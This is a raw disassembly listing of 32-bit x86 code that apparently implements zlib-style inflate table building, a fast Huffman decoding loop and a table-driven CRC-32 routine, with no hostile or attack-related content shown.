  404ba0:	ff 75 18             	push   0x18(%ebp)
  404ba3:	ff 76 28             	push   0x28(%esi)
  404ba6:	ff 56 24             	call   *0x24(%esi)
  404ba9:	59                   	pop    %ecx
  404baa:	59                   	pop    %ecx
  404bab:	8b c3                	mov    %ebx,%eax
  404bad:	5b                   	pop    %ebx
  404bae:	5e                   	pop    %esi
  404baf:	c9                   	leave
  404bb0:	c3                   	ret
  404bb1:	55                   	push   %ebp
  404bb2:	8b ec                	mov    %esp,%ebp
  404bb4:	51                   	push   %ecx
  404bb5:	51                   	push   %ecx
  404bb6:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404bba:	56                   	push   %esi
  404bbb:	8b 75 28             	mov    0x28(%ebp),%esi
  404bbe:	6a 04                	push   $0x4
  404bc0:	68 20 01 00 00       	push   $0x120
  404bc5:	ff 76 28             	push   0x28(%esi)
  404bc8:	ff 56 20             	call   *0x20(%esi)
  404bcb:	83 c4 0c             	add    $0xc,%esp
  404bce:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404bd1:	85 c0                	test   %eax,%eax
  404bd3:	75 08                	jne    0x404bdd
  404bd5:	6a fc                	push   $0xfffffffc
  404bd7:	58                   	pop    %eax
  404bd8:	e9 ef 00 00 00       	jmp    0x404ccc
  404bdd:	53                   	push   %ebx
  404bde:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404be1:	57                   	push   %edi
  404be2:	50                   	push   %eax
  404be3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404be6:	50                   	push   %eax
  404be7:	ff 75 24             	push   0x24(%ebp)
  404bea:	bf 01 01 00 00       	mov    $0x101,%edi
  404bef:	ff 75 14             	push   0x14(%ebp)
  404bf2:	ff 75 1c             	push   0x1c(%ebp)
  404bf5:	68 10 7d 43 00       	push   $0x437d10
  404bfa:	68 90 7c 43 00       	push   $0x437c90
  404bff:	57                   	push   %edi
  404c00:	53                   	push   %ebx
  404c01:	ff 75 10             	push   0x10(%ebp)
  404c04:	e8 94 fb ff ff       	call   0x40479d
  404c09:	83 c4 28             	add    $0x28,%esp
  404c0c:	6a fd                	push   $0xfffffffd
  404c0e:	89 45 28             	mov    %eax,0x28(%ebp)
  404c11:	59                   	pop    %ecx
  404c12:	85 c0                	test   %eax,%eax
  404c14:	0f 85 86 00 00 00    	jne    0x404ca0
  404c1a:	8b 45 14             	mov    0x14(%ebp),%eax
  404c1d:	83 38 00             	cmpl   $0x0,(%eax)
  404c20:	0f 84 8c 00 00 00    	je     0x404cb2
  404c26:	ff 75 fc             	push   -0x4(%ebp)
  404c29:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404c2c:	50                   	push   %eax
  404c2d:	ff 75 24             	push   0x24(%ebp)
  404c30:	8b 45 10             	mov    0x10(%ebp),%eax
  404c33:	ff 75 18             	push   0x18(%ebp)
  404c36:	8d 04 98             	lea    (%eax,%ebx,4),%eax
  404c39:	ff 75 20             	push   0x20(%ebp)
  404c3c:	68 08 7e 43 00       	push   $0x437e08
  404c41:	68 90 7d 43 00       	push   $0x437d90
  404c46:	6a 00                	push   $0x0
  404c48:	ff 75 0c             	push   0xc(%ebp)
  404c4b:	50                   	push   %eax
  404c4c:	e8 4c fb ff ff       	call   0x40479d
  404c51:	83 c4 28             	add    $0x28,%esp
  404c54:	6a fd                	push   $0xfffffffd
  404c56:	89 45 28             	mov    %eax,0x28(%ebp)
  404c59:	59                   	pop    %ecx
  404c5a:	85 c0                	test   %eax,%eax
  404c5c:	75 19                	jne    0x404c77
  404c5e:	8b 45 18             	mov    0x18(%ebp),%eax
  404c61:	83 38 00             	cmpl   $0x0,(%eax)
  404c64:	75 04                	jne    0x404c6a
  404c66:	3b df                	cmp    %edi,%ebx
  404c68:	77 2d                	ja     0x404c97
  404c6a:	ff 75 fc             	push   -0x4(%ebp)
  404c6d:	ff 76 28             	push   0x28(%esi)
  404c70:	ff 56 24             	call   *0x24(%esi)
  404c73:	33 c0                	xor    %eax,%eax
  404c75:	eb 51                	jmp    0x404cc8
  404c77:	3b c1                	cmp    %ecx,%eax
  404c79:	75 09                	jne    0x404c84
  404c7b:	c7 46 18 58 83 43 00 	movl   $0x438358,0x18(%esi)
  404c82:	eb 38                	jmp    0x404cbc
  404c84:	83 f8 fb             	cmp    $0xfffffffb,%eax
  404c87:	75 09                	jne    0x404c92
  404c89:	c7 46 18 3c 83 43 00 	movl   $0x43833c,0x18(%esi)
  404c90:	eb 27                	jmp    0x404cb9
  404c92:	83 f8 fc             	cmp    $0xfffffffc,%eax
  404c95:	74 25                	je     0x404cbc
  404c97:	c7 46 18 18 83 43 00 	movl   $0x438318,0x18(%esi)
  404c9e:	eb 19                	jmp    0x404cb9
  404ca0:	3b c1                	cmp    %ecx,%eax
  404ca2:	75 09                	jne    0x404cad
  404ca4:	c7 46 18 f4 82 43 00 	movl   $0x4382f4,0x18(%esi)
  404cab:	eb 0f                	jmp    0x404cbc
  404cad:	83 f8 fc             	cmp    $0xfffffffc,%eax
  404cb0:	74 0a                	je     0x404cbc
  404cb2:	c7 46 18 d4 82 43 00 	movl   $0x4382d4,0x18(%esi)
  404cb9:	89 4d 28             	mov    %ecx,0x28(%ebp)
  404cbc:	ff 75 fc             	push   -0x4(%ebp)
  404cbf:	ff 76 28             	push   0x28(%esi)
  404cc2:	ff 56 24             	call   *0x24(%esi)
  404cc5:	8b 45 28             	mov    0x28(%ebp),%eax
  404cc8:	59                   	pop    %ecx
  404cc9:	59                   	pop    %ecx
  404cca:	5f                   	pop    %edi
  404ccb:	5b                   	pop    %ebx
  404ccc:	5e                   	pop    %esi
  404ccd:	c9                   	leave
  404cce:	c3                   	ret
  404ccf:	8b 44 24 04          	mov    0x4(%esp),%eax
  404cd3:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  404cd9:	8b 44 24 08          	mov    0x8(%esp),%eax
  404cdd:	c7 00 05 00 00 00    	movl   $0x5,(%eax)
  404ce3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404ce7:	c7 00 10 6b 43 00    	movl   $0x436b10,(%eax)
  404ced:	8b 44 24 10          	mov    0x10(%esp),%eax
  404cf1:	c7 00 10 7b 43 00    	movl   $0x437b10,(%eax)
  404cf7:	33 c0                	xor    %eax,%eax
  404cf9:	c3                   	ret
  404cfa:	55                   	push   %ebp
  404cfb:	8b ec                	mov    %esp,%ebp
  404cfd:	83 ec 18             	sub    $0x18,%esp
  404d00:	8b 55 1c             	mov    0x1c(%ebp),%edx
  404d03:	8b 02                	mov    (%edx),%eax
  404d05:	53                   	push   %ebx
  404d06:	56                   	push   %esi
  404d07:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404d0a:	8b 42 04             	mov    0x4(%edx),%eax
  404d0d:	57                   	push   %edi
  404d0e:	8b 7d 18             	mov    0x18(%ebp),%edi
  404d11:	8b 4f 34             	mov    0x34(%edi),%ecx
  404d14:	8b 5f 20             	mov    0x20(%edi),%ebx
  404d17:	8b 77 1c             	mov    0x1c(%edi),%esi
  404d1a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404d1d:	8b 47 30             	mov    0x30(%edi),%eax
  404d20:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404d23:	3b c8                	cmp    %eax,%ecx
  404d25:	73 05                	jae    0x404d2c
  404d27:	2b c1                	sub    %ecx,%eax
  404d29:	48                   	dec    %eax
  404d2a:	eb 05                	jmp    0x404d31
  404d2c:	8b 47 2c             	mov    0x2c(%edi),%eax
  404d2f:	2b c1                	sub    %ecx,%eax
  404d31:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404d34:	8b 45 08             	mov    0x8(%ebp),%eax
  404d37:	8b 04 85 a0 6a 43 00 	mov    0x436aa0(,%eax,4),%eax
  404d3e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404d41:	8b 45 0c             	mov    0xc(%ebp),%eax
  404d44:	8b 04 85 a0 6a 43 00 	mov    0x436aa0(,%eax,4),%eax
  404d4b:	89 45 0c             	mov    %eax,0xc(%ebp)
  404d4e:	eb 15                	jmp    0x404d65
  404d50:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404d53:	0f b6 00             	movzbl (%eax),%eax
  404d56:	ff 4d f8             	decl   -0x8(%ebp)
  404d59:	8b ce                	mov    %esi,%ecx
  404d5b:	d3 e0                	shl    %cl,%eax
  404d5d:	0b d8                	or     %eax,%ebx
  404d5f:	ff 45 fc             	incl   -0x4(%ebp)
  404d62:	83 c6 08             	add    $0x8,%esi
  404d65:	83 fe 14             	cmp    $0x14,%esi
  404d68:	72 e6                	jb     0x404d50
  404d6a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404d6d:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404d70:	23 c3                	and    %ebx,%eax
  404d72:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
  404d75:	0f b6 08             	movzbl (%eax),%ecx
  404d78:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  404d7b:	85 c9                	test   %ecx,%ecx
  404d7d:	eb 20                	jmp    0x404d9f
  404d7f:	f6 c1 40             	test   $0x40,%cl
  404d82:	0f 85 41 02 00 00    	jne    0x404fc9
  404d88:	8b 0c 8d a0 6a 43 00 	mov    0x436aa0(,%ecx,4),%ecx
  404d8f:	23 cb                	and    %ebx,%ecx
  404d91:	03 48 04             	add    0x4(%eax),%ecx
  404d94:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  404d97:	0f b6 08             	movzbl (%eax),%ecx
  404d9a:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  404d9d:	85 c9                	test   %ecx,%ecx
  404d9f:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  404da3:	0f 84 68 01 00 00    	je     0x404f11
  404da9:	d3 eb                	shr    %cl,%ebx
  404dab:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  404daf:	2b f1                	sub    %ecx,%esi
  404db1:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  404db4:	f6 c1 10             	test   $0x10,%cl
  404db7:	74 c6                	je     0x404d7f
  404db9:	83 e1 0f             	and    $0xf,%ecx
  404dbc:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  404dbf:	8b 0c 8d a0 6a 43 00 	mov    0x436aa0(,%ecx,4),%ecx
  404dc6:	23 cb                	and    %ebx,%ecx
  404dc8:	03 48 04             	add    0x4(%eax),%ecx
  404dcb:	89 4d 18             	mov    %ecx,0x18(%ebp)
  404dce:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  404dd1:	d3 eb                	shr    %cl,%ebx
  404dd3:	2b f1                	sub    %ecx,%esi
  404dd5:	eb 15                	jmp    0x404dec
  404dd7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404dda:	0f b6 00             	movzbl (%eax),%eax
  404ddd:	ff 4d f8             	decl   -0x8(%ebp)
  404de0:	8b ce                	mov    %esi,%ecx
  404de2:	d3 e0                	shl    %cl,%eax
  404de4:	0b d8                	or     %eax,%ebx
  404de6:	ff 45 fc             	incl   -0x4(%ebp)
  404de9:	83 c6 08             	add    $0x8,%esi
  404dec:	83 fe 0f             	cmp    $0xf,%esi
  404def:	72 e6                	jb     0x404dd7
  404df1:	8b 45 0c             	mov    0xc(%ebp),%eax
  404df4:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404df7:	23 c3                	and    %ebx,%eax
  404df9:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
  404dfc:	0f b6 08             	movzbl (%eax),%ecx
  404dff:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  404e02:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  404e06:	d3 eb                	shr    %cl,%ebx
  404e08:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  404e0c:	2b f1                	sub    %ecx,%esi
  404e0e:	eb 2d                	jmp    0x404e3d
  404e10:	f6 45 1c 40          	testb  $0x40,0x1c(%ebp)
  404e14:	0f 85 64 01 00 00    	jne    0x404f7e
  404e1a:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  404e1d:	8b 0c 8d a0 6a 43 00 	mov    0x436aa0(,%ecx,4),%ecx
  404e24:	23 cb                	and    %ebx,%ecx
  404e26:	03 48 04             	add    0x4(%eax),%ecx
  404e29:	8d 04 c8             	lea    (%eax,%ecx,8),%eax
  404e2c:	0f b6 08             	movzbl (%eax),%ecx
  404e2f:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  404e32:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  404e36:	d3 eb                	shr    %cl,%ebx
  404e38:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  404e3b:	2b f1                	sub    %ecx,%esi
  404e3d:	f6 45 1c 10          	testb  $0x10,0x1c(%ebp)
  404e41:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404e44:	74 ca                	je     0x404e10
  404e46:	83 65 1c 0f          	andl   $0xf,0x1c(%ebp)
  404e4a:	eb 16                	jmp    0x404e62
  404e4c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404e4f:	0f b6 19             	movzbl (%ecx),%ebx
  404e52:	ff 4d f8             	decl   -0x8(%ebp)
  404e55:	8b ce                	mov    %esi,%ecx
  404e57:	d3 e3                	shl    %cl,%ebx
  404e59:	09 5d 08             	or     %ebx,0x8(%ebp)
  404e5c:	ff 45 fc             	incl   -0x4(%ebp)
  404e5f:	83 c6 08             	add    $0x8,%esi
  404e62:	3b 75 1c             	cmp    0x1c(%ebp),%esi
  404e65:	72 e5                	jb     0x404e4c
  404e67:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  404e6a:	8b 1c 8d a0 6a 43 00 	mov    0x436aa0(,%ecx,4),%ebx
  404e71:	23 5d 08             	and    0x8(%ebp),%ebx
  404e74:	d3 6d 08             	shrl   %cl,0x8(%ebp)
  404e77:	03 58 04             	add    0x4(%eax),%ebx
  404e7a:	8b 45 18             	mov    0x18(%ebp),%eax
  404e7d:	29 45 f0             	sub    %eax,-0x10(%ebp)
  404e80:	2b f1                	sub    %ecx,%esi
  404e82:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404e85:	8b c1                	mov    %ecx,%eax
  404e87:	2b c3                	sub    %ebx,%eax
  404e89:	8b 5f 28             	mov    0x28(%edi),%ebx
  404e8c:	3b c3                	cmp    %ebx,%eax
  404e8e:	73 60                	jae    0x404ef0
  404e90:	8b 4f 2c             	mov    0x2c(%edi),%ecx
  404e93:	2b cb                	sub    %ebx,%ecx
  404e95:	03 c1                	add    %ecx,%eax
  404e97:	3b c3                	cmp    %ebx,%eax
  404e99:	72 fa                	jb     0x404e95
  404e9b:	8b 4f 2c             	mov    0x2c(%edi),%ecx
  404e9e:	2b c8                	sub    %eax,%ecx
  404ea0:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  404ea3:	39 4d 18             	cmp    %ecx,0x18(%ebp)
  404ea6:	76 24                	jbe    0x404ecc
  404ea8:	29 4d 18             	sub    %ecx,0x18(%ebp)
  404eab:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404eae:	8a 18                	mov    (%eax),%bl
  404eb0:	88 19                	mov    %bl,(%ecx)
  404eb2:	41                   	inc    %ecx
  404eb3:	40                   	inc    %eax
  404eb4:	ff 4d 1c             	decl   0x1c(%ebp)
  404eb7:	75 f5                	jne    0x404eae
  404eb9:	8b 47 28             	mov    0x28(%edi),%eax
  404ebc:	8a 18                	mov    (%eax),%bl
  404ebe:	88 19                	mov    %bl,(%ecx)
  404ec0:	41                   	inc    %ecx
  404ec1:	40                   	inc    %eax
  404ec2:	ff 4d 18             	decl   0x18(%ebp)
  404ec5:	75 f5                	jne    0x404ebc
  404ec7:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404eca:	eb 5c                	jmp    0x404f28
  404ecc:	8a 18                	mov    (%eax),%bl
  404ece:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404ed1:	88 19                	mov    %bl,(%ecx)
  404ed3:	8a 58 01             	mov    0x1(%eax),%bl
  404ed6:	88 59 01             	mov    %bl,0x1(%ecx)
  404ed9:	83 c1 02             	add    $0x2,%ecx
  404edc:	83 c0 02             	add    $0x2,%eax
  404edf:	83 6d 18 02          	subl   $0x2,0x18(%ebp)
  404ee3:	8a 18                	mov    (%eax),%bl
  404ee5:	88 19                	mov    %bl,(%ecx)
  404ee7:	41                   	inc    %ecx
  404ee8:	40                   	inc    %eax
  404ee9:	ff 4d 18             	decl   0x18(%ebp)
  404eec:	75 f5                	jne    0x404ee3
  404eee:	eb d7                	jmp    0x404ec7
  404ef0:	8a 18                	mov    (%eax),%bl
  404ef2:	88 19                	mov    %bl,(%ecx)
  404ef4:	8a 58 01             	mov    0x1(%eax),%bl
  404ef7:	88 59 01             	mov    %bl,0x1(%ecx)
  404efa:	83 c1 02             	add    $0x2,%ecx
  404efd:	83 c0 02             	add    $0x2,%eax
  404f00:	83 6d 18 02          	subl   $0x2,0x18(%ebp)
  404f04:	8a 18                	mov    (%eax),%bl
  404f06:	88 19                	mov    %bl,(%ecx)
  404f08:	41                   	inc    %ecx
  404f09:	40                   	inc    %eax
  404f0a:	ff 4d 18             	decl   0x18(%ebp)
  404f0d:	75 f5                	jne    0x404f04
  404f0f:	eb b6                	jmp    0x404ec7
  404f11:	d3 eb                	shr    %cl,%ebx
  404f13:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  404f17:	8a 40 04             	mov    0x4(%eax),%al
  404f1a:	2b f1                	sub    %ecx,%esi
  404f1c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404f1f:	88 01                	mov    %al,(%ecx)
  404f21:	41                   	inc    %ecx
  404f22:	ff 4d f0             	decl   -0x10(%ebp)
  404f25:	89 5d 08             	mov    %ebx,0x8(%ebp)
  404f28:	81 7d f0 02 01 00 00 	cmpl   $0x102,-0x10(%ebp)
  404f2f:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404f32:	72 0a                	jb     0x404f3e
  404f34:	83 7d f8 0a          	cmpl   $0xa,-0x8(%ebp)
  404f38:	0f 83 27 fe ff ff    	jae    0x404d65
  404f3e:	8b 42 04             	mov    0x4(%edx),%eax
  404f41:	2b 45 f8             	sub    -0x8(%ebp),%eax
  404f44:	8b de                	mov    %esi,%ebx
  404f46:	c1 eb 03             	shr    $0x3,%ebx
  404f49:	3b d8                	cmp    %eax,%ebx
  404f4b:	73 02                	jae    0x404f4f
  404f4d:	8b c3                	mov    %ebx,%eax
  404f4f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404f52:	29 45 fc             	sub    %eax,-0x4(%ebp)
  404f55:	89 5f 20             	mov    %ebx,0x20(%edi)
  404f58:	8b d8                	mov    %eax,%ebx
  404f5a:	03 45 f8             	add    -0x8(%ebp),%eax
  404f5d:	c1 e3 03             	shl    $0x3,%ebx
  404f60:	2b f3                	sub    %ebx,%esi
  404f62:	89 77 1c             	mov    %esi,0x1c(%edi)
  404f65:	89 42 04             	mov    %eax,0x4(%edx)
  404f68:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f6b:	8b f0                	mov    %eax,%esi
  404f6d:	2b 32                	sub    (%edx),%esi
  404f6f:	89 02                	mov    %eax,(%edx)
  404f71:	01 72 08             	add    %esi,0x8(%edx)
  404f74:	89 4f 34             	mov    %ecx,0x34(%edi)
  404f77:	33 c0                	xor    %eax,%eax
  404f79:	e9 ac 00 00 00       	jmp    0x40502a
  404f7e:	8b 4a 04             	mov    0x4(%edx),%ecx
  404f81:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  404f84:	8b c6                	mov    %esi,%eax
  404f86:	c1 e8 03             	shr    $0x3,%eax
  404f89:	c7 42 18 94 83 43 00 	movl   $0x438394,0x18(%edx)
  404f90:	3b c1                	cmp    %ecx,%eax
  404f92:	73 02                	jae    0x404f96
  404f94:	8b c8                	mov    %eax,%ecx
  404f96:	c7 45 1c fd ff ff ff 	movl   $0xfffffffd,0x1c(%ebp)
  404f9d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404fa0:	89 5f 20             	mov    %ebx,0x20(%edi)
  404fa3:	2b c1                	sub    %ecx,%eax
  404fa5:	8b d9                	mov    %ecx,%ebx
  404fa7:	03 4d f8             	add    -0x8(%ebp),%ecx
  404faa:	c1 e3 03             	shl    $0x3,%ebx
  404fad:	2b f3                	sub    %ebx,%esi
  404faf:	89 77 1c             	mov    %esi,0x1c(%edi)
  404fb2:	89 4a 04             	mov    %ecx,0x4(%edx)
  404fb5:	8b c8                	mov    %eax,%ecx
  404fb7:	2b 0a                	sub    (%edx),%ecx
  404fb9:	89 02                	mov    %eax,(%edx)
  404fbb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404fbe:	01 4a 08             	add    %ecx,0x8(%edx)
  404fc1:	89 47 34             	mov    %eax,0x34(%edi)
  404fc4:	8b 45 1c             	mov    0x1c(%ebp),%eax
  404fc7:	eb 61                	jmp    0x40502a
  404fc9:	f6 c1 20             	test   $0x20,%cl
  404fcc:	74 1a                	je     0x404fe8
  404fce:	8b 4a 04             	mov    0x4(%edx),%ecx
  404fd1:	2b 4d f8             	sub    -0x8(%ebp),%ecx
  404fd4:	8b c6                	mov    %esi,%eax
  404fd6:	c1 e8 03             	shr    $0x3,%eax
  404fd9:	3b c1                	cmp    %ecx,%eax
  404fdb:	73 02                	jae    0x404fdf
  404fdd:	8b c8                	mov    %eax,%ecx
  404fdf:	c7 45 1c 01 00 00 00 	movl   $0x1,0x1c(%ebp)
  404fe6:	eb b5                	jmp    0x404f9d
  404fe8:	8b 42 04             	mov    0x4(%edx),%eax
  404feb:	2b 45 f8             	sub    -0x8(%ebp),%eax
  404fee:	8b ce                	mov    %esi,%ecx
  404ff0:	c1 e9 03             	shr    $0x3,%ecx
  404ff3:	c7 42 18 78 83 43 00 	movl   $0x438378,0x18(%edx)
  404ffa:	3b c8                	cmp    %eax,%ecx
  404ffc:	73 02                	jae    0x405000
  404ffe:	8b c1                	mov    %ecx,%eax
  405000:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405003:	89 5f 20             	mov    %ebx,0x20(%edi)
  405006:	8b d8                	mov    %eax,%ebx
  405008:	2b c8                	sub    %eax,%ecx
  40500a:	03 45 f8             	add    -0x8(%ebp),%eax
  40500d:	c1 e3 03             	shl    $0x3,%ebx
  405010:	2b f3                	sub    %ebx,%esi
  405012:	89 77 1c             	mov    %esi,0x1c(%edi)
  405015:	89 42 04             	mov    %eax,0x4(%edx)
  405018:	8b c1                	mov    %ecx,%eax
  40501a:	2b 02                	sub    (%edx),%eax
  40501c:	89 0a                	mov    %ecx,(%edx)
  40501e:	01 42 08             	add    %eax,0x8(%edx)
  405021:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405024:	6a fd                	push   $0xfffffffd
  405026:	89 47 34             	mov    %eax,0x34(%edi)
  405029:	58                   	pop    %eax
  40502a:	5f                   	pop    %edi
  40502b:	5e                   	pop    %esi
  40502c:	5b                   	pop    %ebx
  40502d:	c9                   	leave
  40502e:	c3                   	ret
  40502f:	8b 54 24 08          	mov    0x8(%esp),%edx
  405033:	85 d2                	test   %edx,%edx
  405035:	75 03                	jne    0x40503a
  405037:	33 c0                	xor    %eax,%eax
  405039:	c3                   	ret
  40503a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40503e:	56                   	push   %esi
  40503f:	57                   	push   %edi
  405040:	8b 7c 24 14          	mov    0x14(%esp),%edi
  405044:	f7 d0                	not    %eax
  405046:	b9 ff 00 00 00       	mov    $0xff,%ecx
  40504b:	83 ff 08             	cmp    $0x8,%edi
  40504e:	0f 82 a3 00 00 00    	jb     0x4050f7
  405054:	8b f7                	mov    %edi,%esi
  405056:	c1 ee 03             	shr    $0x3,%esi
  405059:	53                   	push   %ebx
  40505a:	0f b6 1a             	movzbl (%edx),%ebx
  40505d:	33 d8                	xor    %eax,%ebx
  40505f:	23 d9                	and    %ecx,%ebx
  405061:	c1 e8 08             	shr    $0x8,%eax
  405064:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  40506b:	0f b6 5a 01          	movzbl 0x1(%edx),%ebx
  40506f:	33 d8                	xor    %eax,%ebx
  405071:	23 d9                	and    %ecx,%ebx
  405073:	c1 e8 08             	shr    $0x8,%eax
  405076:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  40507d:	0f b6 5a 02          	movzbl 0x2(%edx),%ebx
  405081:	33 d8                	xor    %eax,%ebx
  405083:	23 d9                	and    %ecx,%ebx
  405085:	c1 e8 08             	shr    $0x8,%eax
  405088:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  40508f:	0f b6 5a 03          	movzbl 0x3(%edx),%ebx
  405093:	33 d8                	xor    %eax,%ebx
  405095:	23 d9                	and    %ecx,%ebx
  405097:	c1 e8 08             	shr    $0x8,%eax
  40509a:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  4050a1:	0f b6 5a 04          	movzbl 0x4(%edx),%ebx
  4050a5:	33 d8                	xor    %eax,%ebx
  4050a7:	23 d9                	and    %ecx,%ebx
  4050a9:	c1 e8 08             	shr    $0x8,%eax
  4050ac:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  4050b3:	0f b6 5a 05          	movzbl 0x5(%edx),%ebx
  4050b7:	33 d8                	xor    %eax,%ebx
  4050b9:	23 d9                	and    %ecx,%ebx
  4050bb:	c1 e8 08             	shr    $0x8,%eax
  4050be:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  4050c5:	0f b6 5a 06          	movzbl 0x6(%edx),%ebx
  4050c9:	33 d8                	xor    %eax,%ebx
  4050cb:	23 d9                	and    %ecx,%ebx
  4050cd:	c1 e8 08             	shr    $0x8,%eax
  4050d0:	33 04 9d 80 7e 43 00 	xor    0x437e80(,%ebx,4),%eax
  4050d7:	0f b6 5a 07          	movzbl 0x7(%edx),%ebx
  4050db:	33 d8                	xor    %eax,%ebx
  4050dd:	23 d9                	and    %ecx,%ebx
  4050df:	c1 e8 08             	shr    $0x8,%eax
